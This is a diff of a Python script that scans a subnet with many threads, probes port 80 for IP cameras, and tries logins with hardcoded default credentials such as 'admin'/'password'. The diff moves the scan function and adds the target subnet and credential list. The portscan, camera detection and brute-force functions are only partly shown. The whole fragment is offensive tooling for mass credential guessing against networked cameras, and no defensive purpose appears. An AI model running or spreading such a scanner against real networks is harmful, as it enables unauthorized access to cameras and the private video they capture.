@@ -5,7 +5,6 @@ from queue import Queue
 import netaddr
 
 def ip_range(target_subnet):
-
     network = netaddr.IPNetwork(target_subnet)
     return [str(ip) for ip in network]
 
@@ -36,18 +35,21 @@ def bruteforce(ip, credentials):
         except:
             pass
 
-def scan(ip):
-    if portscan(ip, 80):
-        get_camera(ip, 80)
-        bruteforce(ip, credentials)
-
 try:
+    target_subnet = "192.168.0.0/24"
+    credentials = [('admin', 'password'), ('user', '12345')]
+
     cameras = []
     queue = Queue()
     for ip in ip_range(target_subnet):
         queue.put(ip)
 
     threads = [] 
+
+    def scan(ip):
+        if portscan(ip, 80):
+            get_camera(ip, 80)
+            bruteforce(ip, credentials)
 
     for i in range(256):
         thread = threading.Thread(target=scan, args=(queue.get(),))
